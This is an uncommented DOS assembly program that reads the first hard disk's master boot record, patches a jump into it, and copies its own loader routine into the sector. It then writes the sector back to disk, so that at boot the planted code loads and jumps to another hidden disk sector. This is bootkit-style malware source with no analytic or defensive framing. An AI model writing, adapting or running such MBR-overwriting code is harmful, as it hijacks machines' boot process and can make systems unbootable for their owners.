code            segment
        assume cs:code,ds:code
        org 100h
start:
        mov ax,offset iniz
        push ax
        ret
part:   db 512 dup(0)
        db 0
nome:   db 'd:\part.sec',0
hand:   dw 0
iniz:
        push ds
        pop es
        mov ah,2
        mov al,1
        mov bx,offset part
        xor ch,ch
        mov cl,1
        xor dh,dh
        mov dl,80h
        int 13h
        mov bl,0e9h
        mov byte ptr part,bl        
        mov al,0f5h
        db 0a2h,6,1
        mov al,00
        db 0a2h,7,1
        lea cx,endmy
        lea dx,mycode
        sub cx,dx
        inc cx
        push ds
        pop es
        mov si,offset mycode
        lea bx,part
        add bx,0f8h
        mov di,bx
        rep movsb                
        mov ah,3
        mov al,1
        xor cx,cx
        inc cl
        xor dh,dh
        mov dl,80h
        mov bx,offset part
        int 13h
        int 20h
org 7cf8h
mycode: 
        mov ah,2
        mov al,1
        mov cl,10001100b
        mov ch,00011110b
        mov dh,3
        mov dl,80h
        push cs
        pop es
        mov bx,7e00h
        int 13h
        db 0eah,00,7eh
endmy:  db 0        
code            ends
        end start

